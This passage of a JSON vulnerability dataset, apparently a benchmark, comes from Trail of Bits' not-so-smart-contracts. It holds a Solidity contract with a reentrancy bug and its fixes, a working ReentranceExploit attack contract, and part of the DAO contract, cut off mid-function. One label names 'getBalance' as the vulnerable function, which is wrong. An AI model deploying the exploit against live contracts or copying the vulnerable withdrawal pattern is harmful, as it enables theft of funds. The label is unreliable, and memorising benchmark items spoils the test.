    "file_content": "pragma solidity ^0.4.15;\n\ncontract Reentrance {\n    mapping (address => uint) userBalance;\n   \n    function getBalance(address u) constant returns(uint){\n        return userBalance[u];\n    }\n\n    function addToBalance() payable{\n        userBalance[msg.sender] += msg.value;\n    }   \n\n    function withdrawBalance(){\n        // send userBalance[msg.sender] ethers to msg.sender\n        // if mgs.sender is a contract, it will call its fallback function\n        if( ! (msg.sender.call.value(userBalance[msg.sender])() ) ){\n            throw;\n        }\n        userBalance[msg.sender] = 0;\n    }   \n\n    function withdrawBalance_fixed(){\n        // to protect against re-entrancy, the state variable\n        // has to be change before the call\n        uint amount = userBalance[msg.sender];\n        userBalance[msg.sender] = 0;\n        if( ! (msg.sender.call.value(amount)() ) ){\n            throw;\n        }\n    }   \n\n    function withdrawBalance_fixed_2(){\n        // send() and transfer() are safe against reentrancy\n        // they do not transfer the remaining gas\n        // and they give just enough gas to execute few instructions    \n        // in the fallback function (no further call possible)\n        msg.sender.transfer(userBalance[msg.sender]);\n        userBalance[msg.sender] = 0;\n    }   \n   \n}\n\n",
    "vulnerable_function": "getBalance",
    "vulnerable_lines": [],
    "vulnerability_type": "reentrancy",
    "category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "# Re-entrancy\nA state variable is changed after a contract uses `call.value`. The attacker uses\n[a fallback function](ReentrancyExploit.sol#L26-L33)\u2014which is automatically executed after\nEther is transferred from the targeted contract\u2014to execute the vulnerable function again, *before* the\nstate variable is changed.",
    "fix_description": "",
    "references": [
      "http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/",
      "https://medium.com/spankchain/we-got-spanked-what-we-know-so-far-d5ed3a0f38fe"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "reentrancy/Reentrancy.sol",
    "pragma": "^0.4.15",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_reentrancy_reentrancyexploit",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "ReentrancyExploit.sol",
    "file_content": "pragma solidity ^0.4.15;\n\ncontract ReentranceExploit {\n    bool public attackModeIsOn=false; \n    address public vulnerable_contract;\n    address public owner;\n\n    function ReentranceExploit() public{\n        owner = msg.sender;\n    }\n\n    function deposit(address _vulnerable_contract) public payable{\n        vulnerable_contract = _vulnerable_contract ;\n        // call addToBalance with msg.value ethers\n        require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\"))));\n    }\n\n    function launch_attack() public{\n        attackModeIsOn = true;\n        // call withdrawBalance\n        // withdrawBalance calls the fallback of ReentranceExploit\n        require(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\"))));\n    }  \n\n\n    function () public payable{\n        // atackModeIsOn is used to execute the attack only once\n        // otherwise there is a loop between withdrawBalance and the fallback function\n        if (attackModeIsOn){\n            attackModeIsOn = false;\n                require(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\"))));\n        }\n    }\n\n    function get_money(){\n        suicide(owner);\n    }\n\n}\n",
    "vulnerable_function": "ReentranceExploit",
    "vulnerable_lines": [],
    "vulnerability_type": "reentrancy",
    "category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "# Re-entrancy\nA state variable is changed after a contract uses `call.value`. The attacker uses\n[a fallback function](ReentrancyExploit.sol#L26-L33)\u2014which is automatically executed after\nEther is transferred from the targeted contract\u2014to execute the vulnerable function again, *before* the\nstate variable is changed.",
    "fix_description": "",
    "references": [
      "http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/",
      "https://medium.com/spankchain/we-got-spanked-what-we-know-so-far-d5ed3a0f38fe"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "reentrancy/ReentrancyExploit.sol",
    "pragma": "^0.4.15",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_reentrancy_dao",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "DAO.sol",
    "file_content": "// 0xbb9bc244d798123fde783fcc1c72d3bb8c189413#code\n\n/*\n\n- Bytecode Verification performed was compared on second iteration -\n\nThis file is part of the DAO.\n\nThe DAO is free software: you can redistribute it and/or modify\nit under the terms of the GNU lesser General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nThe DAO is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU lesser General Public License for more details.\n\nYou should have received a copy of the GNU lesser General Public License\nalong with the DAO.  If not, see <http://www.gnu.org/licenses/>.\n*/\n\n\n/*\nBasic, standardized Token contract with no \"premine\". Defines the functions to\ncheck token balances, send tokens, send tokens on behalf of a 3rd party and the\ncorresponding approval process. Tokens need to be created by a derived\ncontract (e.g. TokenCreation.sol).\n\nThank you ConsenSys, this contract originated from:\nhttps://github.com/ConsenSys/Tokens/blob/master/Token_Contracts/contracts/Standard_Token.sol\nWhich is itself based on the Ethereum standardized contract APIs:\nhttps://github.com/ethereum/wiki/wiki/Standardized_Contract_APIs\n*/\n\n/// @title Standard Token Contract.\n\ncontract TokenInterface {\n    mapping (address => uint256) balances;\n    mapping (address => mapping (address => uint256)) allowed;\n\n    /// Total amount of tokens\n    uint256 public totalSupply;\n\n    /// @param _owner The address from which the balance will be retrieved\n    /// @return The balance\n    function balanceOf(address _owner) constant returns (uint256 balance);\n\n    /// @notice Send `_amount` tokens to `_to` from `msg.sender`\n    /// @param _to The address of the recipient\n    /// @param _amount The amount of tokens to be transferred\n    /// @return Whether the transfer was successful or not\n    function transfer(address _to, uint256 _amount) returns (bool success);\n\n    /// @notice Send `_amount` tokens to `_to` from `_from` on the condition it\n    /// is approved by `_from`\n    /// @param _from The address of the origin of the transfer\n    /// @param _to The address of the recipient\n    /// @param _amount The amount of tokens to be transferred\n    /// @return Whether the transfer was successful or not\n    function transferFrom(address _from, address _to, uint256 _amount) returns (bool success);\n\n    /// @notice `msg.sender` approves `_spender` to spend `_amount` tokens on\n    /// its behalf\n    /// @param _spender The address of the account able to transfer the tokens\n    /// @param _amount The amount of tokens to be approved for transfer\n    /// @return Whether the approval was successful or not\n    function approve(address _spender, uint256 _amount) returns (bool success);\n\n    /// @param _owner The address of the account owning tokens\n    /// @param _spender The address of the account able to transfer the tokens\n    /// @return Amount of remaining tokens of _owner that _spender is allowed\n    /// to spend\n    function allowance(\n        address _owner,\n        address _spender\n    ) constant returns (uint256 remaining);\n\n    event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n    event Approval(\n        address indexed _owner,\n        address indexed _spender,\n        uint256 _amount\n    );\n}\n\n\ncontract Token is TokenInterface {\n    // Protects users by preventing the execution of method calls that\n    // inadvertently also transferred ether\n    modifier noEther() {if (msg.value > 0) throw; _}\n\n    function balanceOf(address _owner) constant returns (uint256 balance) {\n        return balances[_owner];\n    }\n\n    function transfer(address _to, uint256 _amount) noEther returns (bool success) {\n        if (balances[msg.sender] >= _amount && _amount > 0) {\n            balances[msg.sender] -= _amount;\n            balances[_to] += _amount;\n            Transfer(msg.sender, _to, _amount);\n            return true;\n        } else {\n           return false;\n        }\n    }\n\n    function transferFrom(\n        address _from,\n        address _to,\n        uint256 _amount\n    ) noEther returns (bool success) {\n\n        if (balances[_from] >= _amount\n            && allowed[_from][msg.sender] >= _amount\n            && _amount > 0) {\n\n            balances[_to] += _amount;\n            balances[_from] -= _amount;\n            allowed[_from][msg.sender] -= _amount;\n            Transfer(_from, _to, _amount);\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    function approve(address _spender, uint256 _amount) returns (bool success) {\n        allowed[msg.sender][_spender] = _amount;\n        Approval(msg.sender, _spender, _amount);\n        return true;\n    }\n\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n        return allowed[_owner][_spender];\n    }\n}\n\n\n/*\nThis file is part of the DAO.\n\nThe DAO is free software: you can redistribute it and/or modify\nit under the terms of the GNU lesser General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nThe DAO is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU lesser General Public License for more details.\n\nYou should have received a copy of the GNU lesser General Public License\nalong with the DAO.  If not, see <http://www.gnu.org/licenses/>.\n*/\n\n\n/*\nBasic account, used by the DAO contract to separately manage both the rewards \nand the extraBalance accounts. \n*/\n\ncontract ManagedAccountInterface {\n    // The only address with permission to withdraw from this account\n    address public owner;\n    // If true, only the owner of the account can receive ether from it\n    bool public payOwnerOnly;\n    // The sum of ether (in wei) which has been sent to this contract\n    uint public accumulatedInput;\n\n    /// @notice Sends `_amount` of wei to _recipient\n    /// @param _amount The amount of wei to send to `_recipient`\n    /// @param _recipient The address to receive `_amount` of wei\n    /// @return True if the send completed\n    function payOut(address _recipient, uint _amount) returns (bool);\n\n    event PayOut(address indexed _recipient, uint _amount);\n}\n\n\ncontract ManagedAccount is ManagedAccountInterface{\n\n    // The constructor sets the owner of the account\n    function ManagedAccount(address _owner, bool _payOwnerOnly) {\n        owner = _owner;\n        payOwnerOnly = _payOwnerOnly;\n    }\n\n    // When the contract receives a transaction without data this is called. \n    // It counts the amount of ether it receives and stores it in \n    // accumulatedInput.\n    function() {\n        accumulatedInput += msg.value;\n    }\n\n    function payOut(address _recipient, uint _amount) returns (bool) {\n        if (msg.sender != owner || msg.value > 0 || (payOwnerOnly && _recipient != owner))\n            throw;\n        if (_recipient.call.value(_amount)()) {\n            PayOut(_recipient, _amount);\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n/*\nThis file is part of the DAO.\n\nThe DAO is free software: you can redistribute it and/or modify\nit under the terms of the GNU lesser General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nThe DAO is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU lesser General Public License for more details.\n\nYou should have received a copy of the GNU lesser General Public License\nalong with the DAO.  If not, see <http://www.gnu.org/licenses/>.\n*/\n\n\n/*\n * Token Creation contract, used by the DAO to create its tokens and initialize\n * its ether. Feel free to modify the divisor method to implement different\n * Token Creation parameters\n*/\n\n\ncontract TokenCreationInterface {\n\n    // End of token creation, in Unix time\n    uint public closingTime;\n    // Minimum fueling goal of the token creation, denominated in tokens to\n    // be created\n    uint public minTokensToCreate;\n    // True if the DAO reached its minimum fueling goal, false otherwise\n    bool public isFueled;\n    // For DAO splits - if privateCreation is 0, then it is a public token\n    // creation, otherwise only the address stored in privateCreation is\n    // allowed to create tokens\n    address public privateCreation;\n    // hold extra ether which has been sent after the DAO token\n    // creation rate has increased\n    ManagedAccount public extraBalance;\n    // tracks the amount of wei given from each contributor (used for refund)\n    mapping (address => uint256) weiGiven;\n\n    /// @dev Constructor setting the minimum fueling goal and the\n    /// end of the Token Creation\n    /// @param _minTokensToCreate Minimum fueling goal in number of\n    ///        Tokens to be created\n    /// @param _closingTime Date (in Unix time) of the end of the Token Creation\n    /// @param _privateCreation Zero means that the creation is public.  A\n    /// non-zero address represents the only address that can create Tokens\n    /// (the address can also create Tokens on behalf of other accounts)\n    // This is the constructor: it can not be overloaded so it is commented out\n    //  function TokenCreation(\n        //  uint _minTokensTocreate,\n        //  uint _closingTime,\n        //  address _privateCreation\n    //  );\n\n    /// @notice Create Token with `_tokenHolder` as the initial owner of the Token\n    /// @param _tokenHolder The address of the Tokens's recipient\n    /// @return Whether the token creation was successful\n    function createTokenProxy(address _tokenHolder) returns (bool success);\n\n    /// @notice Refund `msg.sender` in the case the Token Creation did\n    /// not reach its minimum fueling goal\n    function refund();\n\n    /// @return The divisor used to calculate the token creation rate during\n    /// the creation phase\n    function divisor() constant returns (uint divisor);\n\n    event FuelingToDate(uint value);\n    event CreatedToken(address indexed to, uint amount);\n    event Refund(address indexed to, uint value);\n}\n\n\ncontract TokenCreation is TokenCreationInterface, Token {\n    function TokenCreation(\n        uint _minTokensToCreate,\n        uint _closingTime,\n        address _privateCreation) {\n\n        closingTime = _closingTime;\n        minTokensToCreate = _minTokensToCreate;\n        privateCreation = _privateCreation;\n        extraBalance = new ManagedAccount(address(this), true);\n    }\n\n    function createTokenProxy(address _tokenHolder) returns (bool success) {\n        if (now < closingTime && msg.value > 0\n            && (privateCreation == 0 || privateCreation == msg.sender)) {\n\n            uint token = (msg.value * 20) / divisor();\n            extraBalance.call.value(msg.value - token)();\n            balances[_tokenHolder] += token;\n            totalSupply += token;\n            weiGiven[_tokenHolder] += msg.value;\n            CreatedToken(_tokenHolder, token);\n            if (totalSupply >= minTokensToCreate && !isFueled) {\n                isFueled = true;\n                FuelingToDate(totalSupply);\n            }\n            return true;\n        }\n        throw;\n    }\n\n    function refund() noEther {\n        if (now > closingTime && !isFueled) {\n            // Get extraBalance - will only succeed when called for the first time\n            if (extraBalance.balance >= extraBalance.accumulatedInput())\n                extraBalance.payOut(address(this), extraBalance.accumulatedInput());\n\n            // Execute refund\n            if (msg.sender.call.value(weiGiven[msg.sender])()) {\n                Refund(msg.sender, weiGiven[msg.sender]);\n                totalSupply -= balances[msg.sender];\n                balances[msg.sender] = 0;\n                weiGiven[msg.sender] = 0;\n            }\n        }\n    }\n\n    function divisor() constant returns (uint divisor) {\n        // The number of (base unit) tokens per wei is calculated\n        // as `msg.value` * 20 / `divisor`\n        // The fueling period starts with a 1:1 ratio\n        if (closingTime - 2 weeks > now) {\n            return 20;\n        // Followed by 10 days with a daily creation rate increase of 5%\n        } else if (closingTime - 4 days > now) {\n            return (20 + (now - (closingTime - 2 weeks)) / (1 days));\n        // The last 4 days there is a constant creation rate ratio of 1:1.5\n        } else {\n            return 30;\n        }\n    }\n}\n/*\nThis file is part of the DAO.\n\nThe DAO is free software: you can redistribute it and/or modify\nit under the terms of the GNU lesser General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nThe DAO is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU lesser General Public License for more details.\n\nYou should have received a copy of the GNU lesser General Public License\nalong with the DAO.  If not, see <http://www.gnu.org/licenses/>.\n*/\n\n\n/*\nStandard smart contract for a Decentralized Autonomous Organization (DAO)\nto automate organizational governance and decision-making.\n*/\n\n\ncontract DAOInterface {\n\n    // The amount of days for which people who try to participate in the\n    // creation by calling the fallback function will still get their ether back\n    uint constant creationGracePeriod = 40 days;\n    // The minimum debate period that a generic proposal can have\n    uint constant minProposalDebatePeriod = 2 weeks;\n    // The minimum debate period that a split proposal can have\n    uint constant minSplitDebatePeriod = 1 weeks;\n    // Period of days inside which it's possible to execute a DAO split\n    uint constant splitExecutionPeriod = 27 days;\n    // Period of time after which the minimum Quorum is halved\n    uint constant quorumHalvingPeriod = 25 weeks;\n    // Period after which a proposal is closed\n    // (used in the case `executeProposal` fails because it throws)\n    uint constant executeProposalPeriod = 10 days;\n    // Denotes the maximum proposal deposit that can be given. It is given as\n    // a fraction of total Ether spent plus balance of the DAO\n    uint constant maxDepositDivisor = 100;\n\n    // Proposals to spend the DAO's ether or to choose a new Curator\n    Proposal[] public proposals;\n    // The quorum needed for each proposal is partially calculated by\n    // totalSupply / minQuorumDivisor\n    uint public minQuorumDivisor;\n    // The unix time of the last time quorum was reached on a proposal\n    uint  public lastTimeMinQuorumMet;\n\n    // Address of the curator\n    address public curator;\n    // The whitelist: List of addresses the DAO is allowed to send ether to\n    mapping (address => bool) public allowedRecipients;\n\n    // Tracks the addresses that own Reward Tokens. Those addresses can only be\n    // DAOs that have split from the original DAO. Conceptually, Reward Tokens\n    // represent the proportion of the rewards that the DAO has the right to\n    // receive. These Reward Tokens are generated when the DAO spends ether.\n    mapping (address => uint) public rewardToken;\n    // Total supply of rewardToken\n    uint public totalRewardToken;\n\n    // The account used to manage the rewards which are to be distributed to the\n    // DAO Token Holders of this DAO\n    ManagedAccount public rewardAccount;\n\n    // The account used to manage the rewards which are to be distributed to\n    // any DAO that holds Reward Tokens\n    ManagedAccount public DAOrewardAccount;\n\n    // Amount of rewards (in wei) already paid out to a certain DAO\n    mapping (address => uint) public DAOpaidOut;\n\n    // Amount of rewards (in wei) already paid out to a certain address\n    mapping (address => uint) public paidOut;\n    // Map of addresses blocked during a vote (not allowed to transfer DAO\n    // tokens). The address points to the proposal ID.\n    mapping (address => uint) public blocked;\n\n    // The minimum deposit (in wei) required to submit any proposal that is not\n    // requesting a new Curator (no deposit is required for splits)\n    uint public proposalDeposit;\n\n    // the accumulated sum of all current proposal deposits\n    uint sumOfProposalDeposits;\n\n    // Contract that is able to create a new DAO (with the same code as\n    // this one), used for splits\n    DAO_Creator public daoCreator;\n\n    // A proposal with `newCurator == false` represents a transaction\n    // to be issued by this DAO\n    // A proposal with `newCurator == true` represents a DAO split\n    struct Proposal {\n        // The address where the `amount` will go to if the proposal is accepted\n        // or if `newCurator` is true, the proposed Curator of\n        // the new DAO).\n        address recipient;\n        // The amount to transfer to `recipient` if the proposal is accepted.\n        uint amount;\n        // A plain text description of the proposal\n        string description;\n        // A unix timestamp, denoting the end of the voting period\n        uint votingDeadline;\n        // True if the proposal's votes have yet to be counted, otherwise False\n        bool open;\n        // True if quorum has been reached, the votes have been counted, and\n        // the majority said yes\n        bool proposalPassed;\n        // A hash to check validity of a proposal\n        bytes32 proposalHash;\n        // Deposit in wei the creator added when submitting their proposal. It\n        // is taken from the msg.value of a newProposal call.\n        uint proposalDeposit;\n        // True if this proposal is to assign a new Curator\n        bool newCurator;\n        // Data needed for splitting the DAO\n        SplitData[] splitData;\n        // Number of Tokens in favor of the proposal\n        uint yea;\n        // Number of Tokens opposed to the proposal\n        uint nay;\n        // Simple mapping to check if a shareholder has voted for it\n        mapping (address => bool) votedYes;\n        // Simple mapping to check if a shareholder has voted against it\n        mapping (address => bool) votedNo;\n        // Address of the shareholder who created the proposal\n        address creator;\n    }\n\n    // Used only in the case of a newCurator proposal.\n    struct SplitData {\n        // The balance of the current DAO minus the deposit at the time of split\n        uint splitBalance;\n        // The total amount of DAO Tokens in existence at the time of split.\n        uint totalSupply;\n        // Amount of Reward Tokens owned by the DAO at the time of split.\n        uint rewardToken;\n        // The new DAO contract created at the time of split.\n        DAO newDAO;\n    }\n\n    // Used to restrict access to certain functions to only DAO Token Holders\n    modifier onlyTokenholders {}\n\n    /// @dev Constructor setting the Curator and the address\n    /// for the contract able to create another DAO as well as the parameters\n    /// for the DAO Token Creation\n    /// @param _curator The Curator\n    /// @param _daoCreator The contract able to (re)create this DAO\n    /// @param _proposalDeposit The deposit to be paid for a regular proposal\n    /// @param _minTokensToCreate Minimum required wei-equivalent tokens\n    ///        to be created for a successful DAO Token Creation\n    /// @param _closingTime Date (in Unix time) of the end of the DAO Token Creation\n    /// @param _privateCreation If zero the DAO Token Creation is open to public, a\n    /// non-zero address means that the DAO Token Creation is only for the address\n    // This is the constructor: it can not be overloaded so it is commented out\n    //  function DAO(\n        //  address _curator,\n        //  DAO_Creator _daoCreator,\n        //  uint _proposalDeposit,\n        //  uint _minTokensToCreate,\n        //  uint _closingTime,\n        //  address _privateCreation\n    //  );\n\n    /// @notice Create Token with `msg.sender` as the beneficiary\n    /// @return Whether the token creation was successful\n    function () returns (bool success);\n\n\n    /// @dev This function is used to send ether back\n    /// to the DAO, it can also be used to receive payments that should not be\n    /// counted as rewards (donations, grants, etc.)\n    /// @return Whether the DAO received the ether successfully\n    function receiveEther() returns(bool);\n\n    /// @notice `msg.sender` creates a proposal to send `_amount` Wei to\n    /// `_recipient` with the transaction data `_transactionData`. If\n    /// `_newCurator` is true, then this is a proposal that splits the\n    /// DAO and sets `_recipient` as the new DAO's Curator.\n    /// @param _recipient Address of the recipient of the proposed transaction\n    /// @param _amount Amount of wei to be sent with the proposed transaction\n    /// @param _description String describing the proposal\n    /// @param _transactionData Data of the proposed transaction\n    /// @param _debatingPeriod Time used for debating a proposal, at least 2\n    /// weeks for a regular proposal, 10 days for new Curator proposal\n    /// @param _newCurator Bool defining whether this proposal is about\n    /// a new Curator or not\n    /// @return The proposal ID. Needed for voting on the proposal\n    function newProposal(\n        address _recipient,\n        uint _amount,\n        string _description,\n        bytes _transactionData,\n        uint _debatingPeriod,\n        bool _newCurator\n    ) onlyTokenholders returns (uint _proposalID);\n\n    /// @notice Check that the proposal with the ID `_proposalID` matches the\n    /// transaction which sends `_amount` with data `_transactionData`\n    /// to `_recipient`\n    /// @param _proposalID The proposal ID\n    /// @param _recipient The recipient of the proposed transaction\n    /// @param _amount The amount of wei to be sent in the proposed transaction\n    /// @param _transactionData The data of the proposed transaction\n    /// @return Whether the proposal ID matches the transaction data or not\n    function checkProposalCode(\n        uint _proposalID,\n        address _recipient,\n        uint _amount,\n        bytes _transactionData\n    ) constant returns (bool _codeChecksOut);\n\n    /// @notice Vote on proposal `_proposalID` with `_supportsProposal`\n    /// @param _proposalID The proposal ID\n    /// @param _supportsProposal Yes/No - support of the proposal\n    /// @return The vote ID.\n    function vote(\n        uint _proposalID,\n        bool _supportsProposal\n    ) onlyTokenholders returns (uint _voteID);\n\n    /// @notice Checks whether proposal `_proposalID` with transaction data\n    /// `_transactionData` has been voted for or rejected, and executes the\n    /// transaction in the case it has been voted for.\n    /// @param _proposalID The proposal ID\n    /// @param _transactionData The data of the proposed transaction\n    /// @return Whether the proposed transaction has been executed or not\n    function executeProposal(\n        uint _proposalID,\n        bytes _transactionData\n    ) returns (bool _success);\n\n    /// @notice ATTENTION! I confirm to move my remaining ether to a new DAO\n    /// with `_newCurator` as the new Curator, as has been\n    /// proposed in proposal `_proposalID`. This will burn my tokens. This can\n    /// not be undone and will split the DAO into two DAO's, with two\n    /// different underlying tokens.\n    /// @param _proposalID The proposal ID\n    /// @param _newCurator The new Curator of the new DAO\n    /// @dev This function, when called for the first time for this proposal,\n    /// will create a new DAO and send the sender's portion of the remaining\n    /// ether and Reward Tokens to the new DAO. It will also burn the DAO Tokens\n    /// of the sender.\n    function splitDAO(\n        uint _proposalID,\n        address _newCurator\n    ) returns (bool _success);\n\n    /// @dev can only be called by the DAO itself through a proposal\n    /// updates the contract of the DAO by sending all ether and rewardTokens\n    /// to the new DAO. The new DAO needs to be approved by the Curator\n    /// @param _newContract the address of the new contract\n    function newContract(address _newContract);\n\n\n    /// @notice Add a new possible recipient `_recipient` to the whitelist so\n    /// that the DAO can send transactions to them (using proposals)\n    /// @param _recipient New recipient address\n    /// @dev Can only be called by the current Curator\n    /// @return Whether successful or not\n    function changeAllowedRecipients(address _recipient, bool _allowed) external returns (bool _success);\n\n\n    /// @notice Change the minimum deposit required to submit a proposal\n    /// @param _proposalDeposit The new proposal deposit\n    /// @dev Can only be called by this DAO (through proposals with the\n    /// recipient being this DAO itself)\n    function changeProposalDeposit(uint _proposalDeposit) external;\n\n    /// @notice Move rewards from the DAORewards managed account\n    /// @param _toMembers If true rewards are moved to the actual reward account\n    ///                   for the DAO. If not then it's moved to the DAO itself\n    /// @return Whether the call was successful\n    function retrieveDAOReward(bool _toMembers) external returns (bool _success);\n\n    /// @notice Get my portion of the reward that was sent to `rewardAccount`\n    /// @return Whether the call was successful\n    function getMyReward() returns(bool _success);\n\n    /// @notice Withdraw `_account`'s portion of the reward from `rewardAccount`\n    /// to `_account`'s balance\n    /// @return Whether the call was successful\n    function withdrawRewardFor(address _account) internal returns (bool _success);\n\n    /// @notice Send `_amount` tokens to `_to` from `msg.sender`. Prior to this\n    /// getMyReward() is called.\n    /// @param _to The address of the recipient\n    /// @param _amount The amount of tokens to be transfered\n    /// @return Whether the transfer was successful or not\n    function transferWithoutReward(address _to, uint256 _amount) returns (bool success);\n\n    /// @notice Send `_amount` tokens to `_to` from `_from` on the condition it\n    /// is approved by `_from`. Prior to this getMyReward() is called.\n    /// @param _from The address of the sender\n    /// @param _to The address of the recipient\n    /// @param _amount The amount of tokens to be transfered\n    /// @return Whether the transfer was successful or not\n    function transferFromWithoutReward(\n        address _from,\n        address _to,\n        uint256 _amount\n    ) returns (bool success);\n\n    /// @notice Doubles the 'minQuorumDivisor' in the case quorum has not been\n    /// achieved in 52 weeks\n    /// @return Whether the change was successful or not\n    function halveMinQuorum() returns (bool _success);\n\n    /// @return total number of proposals ever created\n    function numberOfProposals() constant returns (uint _numberOfProposals);\n\n    /// @param _proposalID Id of the new curator proposal\n    /// @return Address of the new DAO\n    function getNewDAOAddress(uint _proposalID) constant returns (address _newDAO);\n\n    /// @param _account The address of the account which is checked.\n    /// @return Whether the account is blocked (not allowed to transfer tokens) or not.\n    function isBlocked(address _account) internal returns (bool);\n\n    /// @notice If the caller is blocked by a proposal whose voting deadline\n    /// has exprired then unblock him.\n    /// @return Whether the account is blocked (not allowed to transfer tokens) or not.\n    function unblockMe() returns (bool);\n\n    event ProposalAdded(\n        uint indexed proposalID,\n        address recipient,\n        uint amount,\n        bool newCurator,\n        string description\n    );\n    event Voted(uint indexed proposalID, bool position, address indexed voter);\n    event ProposalTallied(uint indexed proposalID, bool result, uint quorum);\n    event NewCurator(address indexed _newCurator);\n    event AllowedRecipientChanged(address indexed _recipient, bool _allowed);\n}\n\n// The DAO contract itself\ncontract DAO is DAOInterface, Token, TokenCreation {\n\n    // Modifier that allows only shareholders to vote and create new proposals\n    modifier onlyTokenholders {\n        if (balanceOf(msg.sender) == 0) throw;\n            _\n    }\n\n    function DAO(\n        address _curator,\n        DAO_Creator _daoCreator,\n        uint _proposalDeposit,\n        uint _minTokensToCreate,\n        uint _closingTime,\n        address _privateCreation\n    ) TokenCreation(_minTokensToCreate, _closingTime, _privateCreation) {\n\n        curator = _curator;\n        daoCreator = _daoCreator;\n        proposalDeposit = _proposalDeposit;\n        rewardAccount = new ManagedAccount(address(this), false);\n        DAOrewardAccount = new ManagedAccount(address(this), false);\n        if (address(rewardAccount) == 0)\n            throw;\n        if (address(DAOrewardAccount) == 0)\n            throw;\n        lastTimeMinQuorumMet = now;\n        minQuorumDivisor = 5; // sets the minimal quorum to 20%\n        proposals.length = 1; // avoids a proposal with ID 0 because it is used\n\n        allowedRecipients[address(this)] = true;\n        allowedRecipients[curator] = true;\n    }\n\n    function () returns (bool success) {\n        if (now < closingTime + creationGracePeriod && msg.sender != address(extraBalance))\n            return createTokenProxy(msg.sender);\n        else\n            return receiveEther();\n    }\n\n\n    function receiveEther() returns (bool) {\n        return true;\n    }\n\n\n    function newProposal(\n        address _recipient,\n        uint _amount,\n        string _description,\n        bytes _transactionData,\n        uint _debatingPeriod,\n        bool _newCurator\n    ) onlyTokenholders returns (uint _proposalID) {\n\n        // Sanity check\n        if (_newCurator && (\n            _amount != 0\n            || _transactionData.length != 0\n            || _recipient == curator\n            || msg.value > 0\n            || _debatingPeriod < minSplitDebatePeriod)) {\n            throw;\n        } else if (\n            !_newCurator\n            && (!isRecipientAllowed(_recipient) || (_debatingPeriod <  minProposalDebatePeriod))\n        ) {\n            throw;\n        }\n\n        if (_debatingPeriod > 8 weeks)\n            throw;\n\n        if (!isFueled\n            || now < closingTime\n            || (msg.value < proposalDeposit && !_newCurator)) {\n\n            throw;\n        }\n\n        if (now + _debatingPeriod < now) // prevents overflow\n            throw;\n\n        // to prevent a 51% attacker to convert the ether into deposit\n        if (msg.sender == address(this))\n            throw;\n\n        _proposalID = proposals.length++;\n        Proposal p = proposals[_proposalID];\n        p.recipient = _recipient;\n        p.amount = _amount;\n        p.description = _description;\n        p.proposalHash = sha3(_recipient, _amount, _transactionData);\n        p.votingDeadline = now + _debatingPeriod;\n        p.open = true;\n        //p.proposalPassed = False; // that's default\n        p.newCurator = _newCurator;\n        if (_newCurator)\n            p.splitData.length++;\n        p.creator = msg.sender;\n        p.proposalDeposit = msg.value;\n\n        sumOfProposalDeposits += msg.value;\n\n        ProposalAdded(\n            _proposalID,\n            _recipient,\n            _amount,\n            _newCurator,\n            _description\n        );\n    }\n\n\n    function checkProposalCode(\n        uint _proposalID,\n        address _recipient,\n        uint _amount,\n        bytes _transactionData\n    ) noEther constant returns (bool _codeChecksOut) {\n        Proposal p = proposals[_proposalID];\n        return p.proposalHash == sha3(_recipient, _amount, _transactionData);\n    }\n\n\n    function vote(\n        uint _proposalID,\n        bool _supportsProposal\n    ) onlyTokenholders noEther returns (uint _voteID) {\n\n        Proposal p = proposals[_proposalID];\n        if (p.votedYes[msg.sender]\n            || p.votedNo[msg.sender]\n            || now >= p.votingDeadline) {\n\n            throw;\n        }\n\n        if (_supportsProposal) {\n            p.yea += balances[msg.sender];\n            p.votedYes[msg.sender] = true;\n        } else {\n            p.nay += balances[msg.sender];\n            p.votedNo[msg.sender] = true;\n        }\n\n        if (blocked[msg.sender] == 0) {\n            blocked[msg.sender] = _proposalID;\n        } else if (p.votingDeadline > proposals[blocked[msg.sender]].votingDeadline) {\n            // this proposal's voting deadline is further into the future than\n            // the proposal that blocks the sender so make it the blocker\n            blocked[msg.sender] = _proposalID;\n        }\n\n        Voted(_proposalID, _supportsProposal, msg.sender);\n    }\n\n\n    function executeProposal(\n        uint _proposalID,\n        bytes _transactionData\n    ) noEther returns (bool _success) {\n\n        Proposal p = proposals[_proposalID];\n\n        uint waitPeriod = p.newCurator\n            ? splitExecutionPeriod\n            : executeProposalPeriod;\n        // If we are over deadline and waiting period, assert proposal is closed\n        if (p.open && now > p.votingDeadline + waitPeriod) {\n            closeProposal(_proposalID);\n            return;\n        }\n\n        // Check if the proposal can be executed\n        if (now < p.votingDeadline  // has the voting deadline arrived?\n            // Have the votes been counted?\n    